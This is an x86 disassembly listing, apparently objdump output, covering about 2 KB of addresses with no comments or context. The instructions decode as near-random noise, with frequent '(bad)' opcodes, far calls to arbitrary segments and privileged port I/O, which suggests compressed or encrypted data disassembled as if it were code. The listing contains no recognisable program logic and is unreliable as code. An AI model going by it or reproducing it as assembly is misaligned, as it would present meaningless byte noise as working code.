  41de2a:	inc    ebp
  41de2b:	adc    al,0xd5
  41de2d:	xchg   edx,eax
  41de2e:	and    al,BYTE PTR [edx]
  41de30:	xlat   BYTE PTR ds:[ebx]
  41de31:	rcl    al,cl
  41de33:	push   esp
  41de34:	jmp    0x41de0f
  41de36:	or     al,0x6
  41de38:	or     al,0x33
  41de3a:	mov    WORD PTR [ecx+0x18],fs
  41de3d:	jns    0x41de69
  41de3f:	js     0x41de6f
  41de41:	push   ss
  41de42:	xor    DWORD PTR [edx],eax
  41de44:	psrad  mm3,QWORD PTR [eax+0x47]
  41de48:	and    ebx,DWORD PTR [edx]
  41de4a:	mov    esp,0xe7e66799
  41de4f:	and    DWORD PTR [esi-0x15],esp
  41de52:	inc    edx
  41de53:	test   al,0x36
  41de55:	mov    WORD PTR [ebx+0x3fc59f3f],?
  41de5b:	pop    ss
  41de5c:	out    0x7d,al
  41de5e:	js     0x41de93
  41de60:	or     eax,0xdc0033d2
  41de65:	mov    ecx,0xc860bd47
  41de6a:	push   edi
  41de6b:	push   cs
  41de6c:	in     al,0xba
  41de6e:	xor    BYTE PTR cs:[edi+0x1d],al
  41de72:	jae    0x41de16
  41de74:	push   edx
  41de75:	cmc    
  41de76:	jecxz  0x41de79
  41de78:	ss jle 0x41ddfb
  41de7b:	inc    eax
  41de7c:	outs   dx,DWORD PTR ds:[esi]
  41de7d:	push   0xffffffac
  41de7f:	aam    0x76
  41de81:	mov    DWORD PTR [ecx],ecx
  41de83:	pop    ecx
  41de84:	mov    dl,0xc1
  41de86:	mov    ch,BYTE PTR [eax]
  41de88:	inc    ecx
  41de89:	dec    ecx
  41de8a:	(bad)  
  41de8b:	fadd   DWORD PTR [edx]
  41de8d:	lahf   
  41de8e:	in     eax,dx
  41de8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de90:	mov    eax,ds:0x1f918e92
  41de95:	sbb    bh,BYTE PTR [ebx+0x62]
  41de98:	or     al,0x63
  41de9a:	jns    0x41def2
  41de9c:	pop    esi
  41de9d:	hlt    
  41de9e:	nop
  41de9f:	push   ebx
  41dea0:	and    dl,BYTE PTR [ecx]
  41dea2:	(bad)  [ebx-0x7ff29524]
  41dea8:	repnz mov cl,0x9
  41deab:	aaa    
  41deac:	sbb    DWORD PTR [ebx],ebp
  41deae:	aam    0x87
  41deb0:	xor    DWORD PTR [edx+0x515efd53],esp
  41deb6:	scas   eax,DWORD PTR es:[edi]
  41deb7:	and    ah,BYTE PTR [ecx]
  41deb9:	or     edi,DWORD PTR [ebp+0x69]
  41debc:	aaa    
  41debd:	ins    BYTE PTR es:[edi],dx
  41debe:	pop    ecx
  41debf:	inc    ebx
  41dec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dec1:	jle    0x41dea6
  41dec3:	mov    eax,ds:0xbcd216b7
  41dec8:	push   ebx
  41dec9:	cdq    
  41deca:	rcl    DWORD PTR [ecx-0x1be38f2e],1
  41ded0:	inc    esp
  41ded1:	call   0x2b7:0x1f8c585c
  41ded8:	adc    dl,BYTE PTR [esi+0x23ef4a07]
  41dede:	adc    BYTE PTR [ecx-0x1d9c9018],0xea
  41dee5:	push   edi
  41dee6:	ins    DWORD PTR es:[edi],dx
  41dee7:	mov    dh,ch
  41dee9:	lock adc ax,0x2730
  41deee:	icebp  
  41deef:	pushf  
  41def0:	xchg   dl,ah
  41def2:	dec    esi
  41def3:	(bad)  
  41def4:	sbb    bl,dh
  41def6:	(bad)  
  41def7:	and    eax,0xb51fcfe0
  41defc:	int    0xb7
  41defe:	mov    dl,0xd6
  41df00:	aas    
  41df01:	sar    BYTE PTR [edx+0x71],cl
  41df04:	jae    0x41df4b
  41df06:	test   eax,edi
  41df08:	sti    
  41df09:	repz or BYTE PTR cs:[ebp+0x32],bl
  41df0e:	(bad)  
  41df0f:	mov    ebp,0x33
	...
  41df74:	aas    
  41df75:	daa    
  41df76:	push   ss
  41df77:	cld    
  41df78:	push   ds
  41df79:	std    
  41df7a:	jmp    edi
  41df7c:	dec    edi
  41df7d:	push   0x49919ce9
  41df82:	and    BYTE PTR [edx+0x13ef3],0x5
  41df89:	add    DWORD PTR [eax],eax
  41df8b:	add    BYTE PTR [edi+0x673ebefd],dl
  41df91:	mov    ebp,0xd2119372
  41df96:	and    al,0xd2
  41df98:	jp     0x41df21
  41df9a:	call   0x49c0:0x1baa700b
  41dfa1:	adc    dl,0xbf
  41dfa4:	xor    eax,DWORD PTR [edi-0x3a]
  41dfa7:	dec    ebx
  41dfa8:	dec    eax
  41dfa9:	ret    
  41dfaa:	fstp   TBYTE PTR [ebx+0x5fdbca8e]
  41dfb0:	jo     0x41dfd7
  41dfb2:	add    ecx,DWORD PTR [edi-0x6fa0d57]
  41dfb8:	mov    dl,0x3e
  41dfba:	(bad)  
  41dfbb:	out    dx,al
  41dfbc:	xchg   esi,eax
  41dfbd:	push   ebp
  41dfbe:	xchg   ebp,eax
  41dfbf:	int    0x65
  41dfc1:	mov    eax,ds:0xcf413af7
  41dfc6:	ss std 
  41dfc8:	nop
  41dfc9:	dec    esi
  41dfca:	sbb    al,0x85
  41dfcc:	push   ebx
  41dfcd:	xchg   BYTE PTR [edx-0x73929415],bh
  41dfd3:	popf   
  41dfd4:	push   es
  41dfd5:	loope  0x41dfa6
  41dfd7:	(bad)  [edi+0x66314aeb]
  41dfde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dfdf:	jno    0x41df9d
  41dfe1:	pop    edi
  41dfe2:	sub    DWORD PTR [edi+0x19],ebx
  41dfe5:	rcr    ecx,1
  41dfe7:	in     eax,dx
  41dfe8:	movq   mm7,QWORD PTR ds:0xc83e9576
  41dfef:	jecxz  0x41dfaa
  41dff1:	push   cs
  41dff2:	es pusha 
  41dff4:	mov    al,ds:0x1e74b25f
  41dff9:	jns    0x41dfff
  41dffb:	fdivr  DWORD PTR [ecx]
  41dffd:	adc    eax,0xbaa392c8
  41e002:	sbb    eax,0x19edcef8
  41e007:	into   
  41e008:	cdq    
  41e009:	mov    dh,0x7f
  41e00b:	pop    ds
  41e00c:	ror    BYTE PTR ds:0xb75c7222,0x4a
  41e013:	mov    ds:0x336c227b,al
  41e018:	js     0x41e05e
  41e01a:	cwde   
  41e01b:	push   0xfffffff8
  41e01d:	push   DWORD PTR ds:0x8a4e256a
  41e023:	sub    BYTE PTR [edx+0x79],bh
  41e026:	dec    ecx
  41e027:	aam    0xb7
  41e029:	push   eax
  41e02a:	inc    esi
  41e02b:	les    ecx,FWORD PTR [eax+0x4c]
  41e02e:	mov    cl,0xb4
  41e030:	mov    ds:0xf6ec42a0,eax
  41e035:	cmp    eax,0x5b7e4e5d
  41e03a:	scas   eax,DWORD PTR es:[edi]
  41e03b:	or     ah,bl
  41e03d:	hlt    
  41e03e:	add    BYTE PTR ds:0x793f369b,al
  41e044:	int3   
  41e045:	pop    esp
  41e046:	mov    ecx,0x8718d8bc
  41e04b:	addr16 pop ebp
  41e04d:	call   0x7ef1:0x8285
  41e053:	(bad)  
  41e054:	pusha  
  41e055:	sub    dl,bl
  41e057:	inc    eax
  41e058:	mov    dl,0xe1
  41e05a:	mov    al,0xb6
  41e05c:	idiv   ah
  41e05e:	adc    edx,DWORD PTR [ebp-0x63]
  41e061:	(bad)  
  41e062:	mov    bh,BYTE PTR [edx-0x1c]
  41e065:	inc    ebp
  41e066:	pop    esi
  41e067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e068:	mov    DWORD PTR [eax-0x16],ebx
  41e06b:	daa    
  41e06c:	jl     0x41e038
  41e06e:	popf   
  41e06f:	xor    al,0x40
  41e071:	sbb    DWORD PTR [ebp+0x21],esp
  41e074:	sub    al,0x90
  41e076:	mov    eax,ds:0xe3b80bb0
  41e07b:	push   cs
  41e07c:	cmp    al,0x7c
  41e07e:	mov    eax,ds:0x39192b21
  41e083:	mov    BYTE PTR [edx],ch
  41e085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e086:	pop    ebp
  41e087:	ficomp DWORD PTR [ebp+0x63]
  41e08a:	out    dx,al
  41e08b:	dec    esi
  41e08c:	in     eax,dx
  41e08d:	sub    al,0xea
  41e08f:	test   DWORD PTR [eax+0x0],esp
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	and    bl,bh
  41e102:	rol    al,1
  41e104:	clc    
  41e105:	aas    
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    eax,0xb5000001
  41e10d:	leave  
  41e10e:	idiv   DWORD PTR ds:0xea5c3fa
  41e114:	push   ecx
  41e115:	pop    ecx
  41e116:	fnstsw WORD PTR [ebp+edi*2-0x7215f8b3]
  41e11d:	es jbe 0x41e0f5
  41e120:	sub    eax,0xc35409f
  41e125:	push   esp
  41e126:	pop    eax
  41e127:	mov    dh,0xcf
  41e129:	pop    ecx
  41e12a:	mov    ds:0xe9a86cfd,al
  41e12f:	retf   0xde93
  41e132:	in     al,0xd8
  41e134:	mov    al,ds:0xc8dd2786
  41e139:	mov    ebx,0xec09e452
  41e13e:	add    al,0x9f
  41e140:	stos   BYTE PTR es:[edi],al
  41e141:	push   edx
  41e142:	test   eax,0x7bc97a8a
  41e147:	stc    
  41e148:	pop    ss
  41e149:	test   DWORD PTR [edi],ecx
  41e14b:	aaa    
  41e14c:	lods   al,BYTE PTR es:[esi]
  41e14e:	cmp    edi,DWORD PTR [ebp-0x7c96e904]
  41e154:	arpl   WORD PTR [ebp-0x7e3b2046],cx
  41e15a:	or     al,BYTE PTR [ecx+0x7e]
  41e15d:	in     eax,0xbd
  41e15f:	dec    ebp
  41e160:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e161:	add    eax,0x8edc86ff
  41e166:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e167:	dec    edx
  41e168:	xor    BYTE PTR [ebx+0x1516ae90],cl
  41e16e:	sbb    DWORD PTR [eax+0x53],0x140e122f
  41e175:	push   ecx
  41e176:	mov    BYTE PTR [ecx+0x8],dl
  41e179:	lods   al,BYTE PTR ds:[esi]
  41e17a:	aam    0x11
  41e17c:	out    0x5a,al
  41e17e:	or     BYTE PTR [eax-0x503e1952],cl
  41e184:	rol    DWORD PTR [ebx-0x58f1a217],0xdc
  41e18b:	(bad)  
  41e18d:	icebp  
  41e18e:	sub    eax,0x3d0750fd
  41e193:	popf   
  41e194:	and    eax,0xdbb9f7b6
  41e199:	(bad)  
  41e19b:	xchg   DWORD PTR [ebx],ebx
  41e19d:	sahf   
  41e19e:	mov    dl,0x27
  41e1a0:	(bad)  
  41e1a1:	mov    bh,0xa5
  41e1a3:	mov    edi,0x1fd7b11c
  41e1a8:	add    eax,0x20a72f37
  41e1ad:	or     ebx,DWORD PTR [ecx+0x10]
  41e1b0:	js     0x41e155
  41e1b2:	push   edi
  41e1b3:	ds mov esi,fs
  41e1b6:	sbb    DWORD PTR [ebp-0x1dc9d077],eax
  41e1bc:	inc    esi
  41e1bd:	test   DWORD PTR [ebp+0x59921875],edx
  41e1c3:	inc    ebp
  41e1c4:	pop    ebp
  41e1c5:	sub    eax,0x413f45a9
  41e1ca:	imul   ebx,DWORD PTR [edi],0x925ce727
  41e1d0:	(bad)
  41e1d4:	pop    eax
  41e1d5:	xor    al,0xda
  41e1d7:	xchg   esp,eax
  41e1d8:	dec    esp
  41e1d9:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e1db:	push   cs
  41e1dc:	psubb  mm3,QWORD PTR [ebp+esi*1-0x284ecca9]
  41e1e4:	jno    0x41e207
  41e1e6:	lods   al,BYTE PTR ds:[esi]
  41e1e7:	mov    ebp,0xccb5f98
  41e1ec:	outs   dx,DWORD PTR ds:[esi]
  41e1ed:	cmc    
  41e1ee:	les    ebx,FWORD PTR [ebp-0x30]
  41e1f1:	push   eax
  41e1f2:	ret    
  41e1f3:	ret    
  41e1f4:	mov    cl,BYTE PTR [edx+esi*8-0x7048e0e9]
  41e1fb:	mov    ch,0x8
  41e1fd:	mov    esp,0x123d79ed
  41e202:	xchg   edx,eax
  41e203:	sub    eax,0x3dd5248e
  41e208:	xor    al,0x29
  41e20a:	sbb    bh,BYTE PTR [eax+ecx*8-0x59]
  41e20e:	push   edi
  41e20f:	pop    edi
  41e210:	lods   eax,DWORD PTR ds:[esi]
	...
  41e271:	add    BYTE PTR [eax],al
  41e273:	add    BYTE PTR [ebx-0x1988fe],ch
  41e279:	idiv   DWORD PTR [ebx+0x6f64c34f]
  41e27f:	or     al,0x85
  41e281:	das    
  41e282:	jge    0x41e282
  41e284:	std    
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    eax,0x2c000001
  41e28d:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41e28f:	adc    al,0xaf
  41e291:	mov    cl,0x61
  41e293:	jmp    0x65a6116
  41e298:	mov    eax,0x4926b8cc
  41e29d:	fmul   QWORD PTR [eax+0x41a18695]
  41e2a3:	push   esi
  41e2a4:	out    dx,al
  41e2a5:	mov    eax,0x62e826c7
  41e2aa:	repz pop es
  41e2ac:	(bad)  
  41e2ad:	push   edi
  41e2ae:	and    eax,0x8a8a99bf
  41e2b3:	sub    al,0x42
  41e2b5:	mov    esp,0xa4008a80
  41e2ba:	lods   eax,DWORD PTR ds:[esi]
  41e2bb:	aas    
  41e2bc:	(bad)
  41e2bf:	or     BYTE PTR [edi+0x15f17a3],cl
  41e2c5:	(bad)  
  41e2c6:	out    dx,eax
  41e2c7:	lds    edi,FWORD PTR [ebx]
  41e2c9:	shl    BYTE PTR [edx],1
  41e2cb:	aam    0xf0
  41e2cd:	adc    edi,eax
  41e2cf:	cmp    ebp,esi
  41e2d1:	bnd jbe 0x41e28d
  41e2d4:	hlt    
  41e2d5:	xchg   esp,eax
  41e2d6:	jg     0x41e33a
  41e2d8:	ins    DWORD PTR es:[edi],dx
  41e2d9:	retf   0x1602
  41e2dc:	test   ah,0x23
  41e2df:	pop    es
  41e2e0:	mov    dh,bl
  41e2e2:	fdiv   DWORD PTR [eax]
  41e2e4:	sub    BYTE PTR [edx],ch
  41e2e6:	mov    ch,0xd8
  41e2e8:	xor    al,0x7f
  41e2ea:	mov    ebx,0x3caf65dd
  41e2ef:	clc    
  41e2f0:	fs jno 0x41e2c8
  41e2f3:	fst    QWORD PTR [ecx-0x7]
  41e2f6:	retf   
  41e2f7:	mov    eax,ds:0x7544097e
  41e2fc:	cmp    eax,ebx
  41e2fe:	add    BYTE PTR [eax],bh
  41e300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e301:	cmc    
  41e302:	cli    
  41e303:	icebp  
  41e304:	sub    bl,BYTE PTR [ecx]
  41e306:	dec    esi
  41e307:	adc    cl,dl
  41e309:	xor    eax,0x1e9018b9
  41e30e:	xor    al,BYTE PTR [ecx-0x6c]
  41e311:	(bad)  [esi-0x5d]
  41e314:	mov    esp,0x20d796c9
  41e319:	jp     0x41e337
  41e31b:	mov    dh,0x2
  41e31d:	shr    ecx,1
  41e31f:	dec    esp
  41e320:	xchg   BYTE PTR [ebx+esi*4+0x7e],dh
  41e324:	mov    cl,BYTE PTR [ebx+0x10]
  41e327:	outs   dx,BYTE PTR ds:[esi]
  41e328:	test   eax,0xa449530
  41e32d:	daa    
  41e32e:	or     DWORD PTR [ecx+0x36],esi
  41e331:	dec    ebx
  41e332:	xor    eax,0xb5311fa7
  41e337:	repz push 0x7bbed1da
  41e33d:	dec    eax
  41e33e:	dec    esi
  41e33f:	push   edi
  41e340:	mov    ebx,0x81ad39a3
  41e345:	scas   al,BYTE PTR es:[edi]
  41e346:	cmp    BYTE PTR ds:[ecx-0xb502e8c],bh
  41e34d:	xchg   ebp,eax
  41e34e:	mov    edx,0x9de7bd9b
  41e353:	pushf  
  41e354:	mov    DWORD PTR [bp+di-0x7ffb],esi
  41e359:	cld    
  41e35a:	rol    BYTE PTR [ebx-0x38],cl
  41e35d:	ds test ebx,ecx
  41e360:	add    DWORD PTR [eax+0x3c],ebx
  41e363:	or     BYTE PTR [ebp+0x36],ch
  41e366:	mov    es,esi
  41e368:	jno    0x41e357
  41e36a:	clc    
  41e36b:	jns    0x41e3e7
  41e36d:	adc    ecx,DWORD PTR [ecx-0x50]
  41e370:	out    0x97,eax
  41e372:	cmp    al,0xe2
  41e374:	cmp    BYTE PTR [eax-0x11],ah
  41e377:	stc    
  41e378:	gs ss sahf 
  41e37b:	fbstp  TBYTE PTR ds:[edi+0x2de1a18c]
  41e382:	fs sbb ch,cl
  41e385:	mov    al,ds:0x41ab111c
  41e38a:	or     eax,0xc0aeab3e
  41e38f:	mov    al,0x2e
	...
  41e3f1:	add    BYTE PTR [eax],al
  41e3f3:	add    BYTE PTR [ecx-0xe088ee],cl
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x5e8a5d09
  41e403:	rol    BYTE PTR [edx],0x42
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    eax,0xa7000001
  41e40d:	add    BYTE PTR [edx],dh
  41e40f:	push   0x8d75d7c7
  41e414:	xlat   BYTE PTR ds:[ebx]
  41e415:	fild   DWORD PTR [eax-0x3f]
  41e418:	xchg   ebp,eax
  41e419:	fist   DWORD PTR ss:[esi]
  41e41c:	call   0x36b0:0x8ed66b54
  41e423:	ins    DWORD PTR es:[edi],dx
  41e424:	mov    ds:0x53e091ff,eax
  41e429:	lahf   
  41e42a:	icebp  
  41e42b:	sahf   
  41e42c:	add    BYTE PTR ds:[ebp+0x54],bl
  41e430:	cli    
  41e431:	in     eax,0xa3
  41e433:	ins    BYTE PTR es:[edi],dx
  41e434:	lods   al,BYTE PTR ds:[esi]
  41e435:	push   cs
  41e436:	jl     0x41e426
  41e438:	lock adc al,cl
  41e43b:	int3   
  41e43c:	or     al,0x4c
  41e43e:	inc    ecx
  41e43f:	cdq    
  41e440:	test   DWORD PTR [ebp+edi*8-0xfbfcb0e],0x401fd5c0
  41e44b:	sbb    BYTE PTR [ecx+0x2a59740a],0xb5
  41e452:	push   ds
  41e453:	mov    al,0x2d
  41e455:	jo     0x41e3da
  41e457:	sub    ah,dh
  41e459:	jne    0x41e3e1
  41e45b:	ret    
  41e45c:	(bad)  [esi-0x587fa407]
  41e462:	loop   0x41e3fe
  41e464:	mov    esi,?
  41e466:	aas    
  41e467:	std    
  41e468:	sbb    al,BYTE PTR [eax+0x26]
  41e46b:	arpl   WORD PTR [edi+0x7beb2e6f],si
  41e471:	pop    esp
  41e472:	and    dh,dh
  41e474:	(bad)
  41e477:	inc    ebp
  41e478:	pop    eax
  41e479:	repnz pop es
  41e47b:	lahf   
  41e47c:	call   0x87bc:0xcf642a63
  41e483:	mov    ah,0xa3
  41e485:	add    DWORD PTR ss:[edi-0x33],ebp
  41e489:	sub    BYTE PTR [eax],0x2a
  41e48c:	aam    0xde
  41e48e:	push   edx
  41e48f:	addr16 sbb al,0xfc
  41e492:	fwait
  41e493:	dec    edx
  41e494:	and    al,0xb0
  41e496:	ds loop 0x41e433
  41e499:	push   0x969b29cc
  41e49e:	mov    ebp,0xe44a0356
  41e4a3:	push   0x68bb82ef
  41e4a8:	std    
  41e4a9:	jbe    0x41e4b1
  41e4ab:	or     al,0xd9
  41e4ad:	ins    DWORD PTR es:[edi],dx
  41e4ae:	fwait
  41e4af:	shl    BYTE PTR [ecx+0x64],0xad
  41e4b3:	xor    BYTE PTR [ebx],al
  41e4b5:	or     DWORD PTR [ecx+0x411d695b],esp
  41e4bb:	mov    edi,0xef4b7b2f
  41e4c0:	clc    
  41e4c1:	aas    
  41e4c2:	sbb    al,0xb5
  41e4c4:	pusha  
  41e4c5:	pop    ecx
  41e4c6:	stos   DWORD PTR es:[edi],eax
  41e4c7:	stos   DWORD PTR es:[edi],eax
  41e4c8:	and    ebp,0x53fa0f52
  41e4ce:	lahf   
  41e4cf:	loopne 0x41e4e3
  41e4d1:	or     al,0x2f
  41e4d3:	dec    ebx
  41e4d4:	pop    edi
  41e4d5:	test   eax,0xa43b9797
  41e4da:	out    0xba,eax
  41e4dc:	mov    esp,0x12aa0ba3
  41e4e1:	int    0x9
  41e4e3:	mov    esi,0x9d2aeba7
  41e4e8:	shl    bh,0xb2
  41e4eb:	mov    eax,0x7edbe8d2
  41e4f0:	shl    BYTE PTR [esi],cl
  41e4f2:	xor    bl,BYTE PTR [edi]
  41e4f4:	imul   ebp,ecx,0x8a918cd7
  41e4fa:	jge    0x41e564
  41e4fc:	and    BYTE PTR [esi+0x8],cl
  41e4ff:	mov    DWORD PTR [esi-0x6cb42113],esi
  41e505:	mov    ch,0x77
  41e507:	sub    edx,DWORD PTR [ecx+0x46]
  41e50a:	fcmovnb st,st(4)
  41e50c:	mov    ds:0x614a33a2,al
	...
  41e571:	add    BYTE PTR [eax],al
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e561
  41e581:	repnz lahf 
  41e583:	xchg   edx,eax
  41e584:	pop    es
  41e585:	inc    ebx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    eax,0xad000001
  41e58d:	ret    
  41e58e:	pop    ebp
  41e58f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e590:	add    eax,0x3e0f61ad
  41e595:	inc    ebp
  41e596:	(bad)  
  41e597:	rcl    BYTE PTR [edi],0x93
  41e59a:	push   ss
  41e59b:	mov    eax,edx
  41e59d:	mov    al,ds:0x5ee18040
  41e5a2:	das    
  41e5a3:	aam    0xb4
  41e5a5:	loop   0x41e556
  41e5a7:	mov    DWORD PTR [edx+0x6a5db990],esp
  41e5ad:	jle    0x41e537
  41e5af:	shl    DWORD PTR [edx+ebx*8-0x723d707e],0xab
  41e5b7:	mov    ebp,0x24af2dc5
  41e5bc:	fs xchg edi,eax
  41e5be:	jb     0x41e542
  41e5c0:	(bad)  
  41e5c1:	fisubr DWORD PTR [ecx-0x3a8fe8f3]
  41e5c7:	outs   dx,DWORD PTR ds:[esi]
  41e5c8:	mov    esi,0xaba29f88
  41e5cd:	ret    
  41e5ce:	jle    0x41e5d8
  41e5d0:	bound  edx,QWORD PTR [esp+edi*1-0x57d36eb9]
  41e5d7:	add    ecx,esp
  41e5d9:	and    eax,0x3120d8e1
  41e5de:	into   
  41e5df:	sbb    dl,BYTE PTR [ebp+0x58]
  41e5e2:	fcomp  DWORD PTR [ebp+0x70]
  41e5e5:	push   cs
  41e5e6:	mov    ebp,0xd1f2b049
  41e5eb:	out    dx,eax
  41e5ec:	imul   DWORD PTR [eax+0x79]
  41e5ef:	adc    al,0x67
  41e5f1:	mov    edx,0x81eee7c3
  41e5f6:	mov    dh,0x78
  41e5f8:	pop    ss
  41e5f9:	add    bl,0x27
  41e5fc:	call   0xa017:0xb87970fe
  41e603:	(bad)  
  41e604:	jns    0x41e622
  41e606:	fbstp  TBYTE PTR ds:0x2ca11e5b
  41e60c:	int3   
  41e60d:	imul   esi,DWORD PTR [ebp+0x6a7a8e4b],0x73
  41e614:	rcr    DWORD PTR [esi-0x3f],0x86
  41e618:	leave  
  41e619:	jo     0x41e60c
  41e61b:	fs mov ch,0xca
  41e61e:	les    ebp,FWORD PTR [eax]
  41e620:	pop    es
  41e621:	xadd   DWORD PTR [ebp-0x1ffc1faa],esi
  41e628:	imul   ecx,DWORD PTR [edx+eiz*1-0xe],0xfe36de41
  41e630:	fdiv   st,st(2)
  41e632:	dec    ebx
  41e633:	and    ch,0x17
  41e636:	mov    bh,0xd7
  41e638:	jmp    0x714f:0xeacb222b
  41e63f:	jp     0x41e6b9
  41e641:	ret    
  41e642:	dec    esp
  41e643:	and    eax,0xe0165245
  41e648:	pop    edx
  41e649:	into   
  41e64a:	pop    ss
  41e64b:	dec    edx
  41e64c:	clc    
  41e64d:	pop    edi
  41e64e:	mov    ds:0x3ca5e7fa,eax
  41e653:	and    BYTE PTR [edx+edi*1+0x4dcbf5a5],bl
  41e65a:	nop    DWORD PTR [edi+edi*1]
  41e65e:	push   edi
  41e65f:	nop
  41e660:	push   ds
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	in     al,dx
  41e663:	inc    ecx
  41e664:	nop
  41e665:	push   cs
  41e666:	scas   eax,DWORD PTR es:[edi]
  41e667:	cmp    eax,DWORD PTR [esi-0x7fbb8d5a]
  41e66d:	scas   eax,DWORD PTR es:[edi]
  41e66e:	sti    
  41e66f:	push   edx
  41e670:	mov    ebp,0xc2ead7ab
  41e675:	leave  
  41e676:	shl    BYTE PTR [edx],1
  41e678:	dec    esi
  41e679:	(bad)  
  41e67a:	jne    0x41e602
  41e67c:	xchg   BYTE PTR [ecx],ah
  41e67e:	rol    DWORD PTR [edx-0x63],1
  41e681:	add    DWORD PTR [esp+edi*2-0x49],ebp
  41e685:	arpl   WORD PTR [ebp+0x3b4641be],sp
  41e68b:	sub    eax,0xda0ccd73
  41e690:	xor    al,0x0
	...
  41e6f2:	add    BYTE PTR [eax],al
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ebp,DWORD PTR [edi+0xcd6b191]
  41e705:	inc    esp
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    eax,0x88000001
  41e70d:	jns    0x41e6db
  41e70f:	ror    DWORD PTR [ebp+0x6f],0x91
  41e713:	rcr    DWORD PTR [ecx],1
  41e715:	and    bl,BYTE PTR ds:[ebx-0x30]
  41e719:	mov    bh,0xca
  41e71b:	ret    
  41e71c:	fidiv  DWORD PTR [ebp-0x7f159d94]
  41e722:	adc    DWORD PTR [ecx+0x2ac803],esi
  41e728:	das    
  41e729:	fadd   DWORD PTR [ebx-0x15]
  41e72c:	retf   
  41e72d:	jge    0x41e7ae
  41e72f:	push   edi
  41e730:	sub    al,0xfb
  41e732:	out    0xfb,eax
  41e734:	cmp    al,0xfd
  41e736:	cld    
  41e737:	sub    al,0x13
  41e739:	sahf   
  41e73a:	mov    edi,0x3a8f2cdb
  41e73f:	or     eax,0x79f5f680
  41e744:	sub    bh,cl
  41e746:	or     eax,0xeeaafbd3
  41e74b:	imul   ebx,esi,0x7f12fe77
  41e751:	call   0xc8d5:0x8ba15324
  41e758:	popa   
  41e759:	ins    DWORD PTR es:[edi],dx
  41e75a:	shr    eax,1
  41e75c:	aam    0xce
  41e75e:	repz mov eax,0x115060fc
  41e764:	xchg   ecx,eax
  41e765:	xor    bl,BYTE PTR [ecx-0x21b39e04]
  41e76b:	mulps  xmm4,XMMWORD PTR [ebp+eiz*4+0x54]
  41e770:	push   ecx
  41e771:	mov    al,BYTE PTR [esi-0x4b]
  41e774:	ins    DWORD PTR es:[edi],dx
  41e775:	mov    ds:0x39ee57bf,al
  41e77a:	mov    WORD PTR [edx-0x63],?
  41e77d:	popf   
  41e77e:	pushf  
  41e77f:	push   cs
  41e780:	inc    edi
  41e781:	int3   
  41e782:	pushf  
  41e783:	outs   dx,DWORD PTR ds:[esi]
  41e784:	sbb    BYTE PTR [edi+ebx*4],ch
  41e787:	cdq    
  41e788:	stc    
  41e789:	outs   dx,BYTE PTR ds:[esi]
  41e78a:	sub    edi,ecx
  41e78c:	in     al,dx
  41e78d:	shl    BYTE PTR [ebx-0x70],cl
  41e790:	mov    al,ds:0x1e62e6fc
  41e795:	xchg   esi,eax
  41e796:	dec    esi
  41e797:	loop   0x41e746
  41e799:	add    ecx,eax
  41e79b:	add    ebp,DWORD PTR [esi+eiz*2]
  41e79e:	push   edi
  41e79f:	add    DWORD PTR [ebx+0x4f2b8c2a],edi
  41e7a5:	pop    edx
  41e7a6:	xor    BYTE PTR ss:[ecx-0x51],ah
  41e7aa:	xor    al,0xd6
  41e7ac:	loop   0x41e82d
  41e7ae:	aam    0x1f
  41e7b0:	inc    esp
  41e7b1:	hlt    
  41e7b2:	and    al,0xa4
  41e7b4:	lds    ecx,FWORD PTR [edi-0x6d]
  41e7b7:	inc    eax
  41e7b8:	rol    BYTE PTR [ecx],1
  41e7ba:	xor    al,0x12
  41e7bc:	pop    esp
  41e7bd:	push   ds
  41e7be:	popa   
  41e7bf:	fcom   st(0)
  41e7c1:	inc    esp
  41e7c2:	push   es
  41e7c3:	aam    0xaf
  41e7c5:	xor    eax,0x983bcc
  41e7ca:	or     al,0x31
  41e7cc:	sub    esi,DWORD PTR [edx+0x2b]
  41e7cf:	into   
  41e7d0:	ja     0x41e7dd
  41e7d2:	cmp    eax,0x93cbe39b
  41e7d7:	cmp    cl,dh
  41e7d9:	scas   al,BYTE PTR es:[edi]
  41e7da:	ja     0x41e7e5
  41e7dc:	and    eax,0xe53b902b
  41e7e1:	test   eax,esi
  41e7e3:	in     al,0xeb
  41e7e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e7e6:	jno    0x41e7fb
  41e7e8:	xchg   esi,eax
  41e7e9:	mov    bh,0xcf
  41e7eb:	inc    edx
  41e7ec:	or     edi,ebx
  41e7ee:	enter  0xe232,0xf2
  41e7f2:	xor    al,0xbe
  41e7f4:	loopne 0x41e7f0
  41e7f6:	inc    ebx
  41e7f7:	aam    0x6a
  41e7f9:	add    BYTE PTR [edx],0xe6
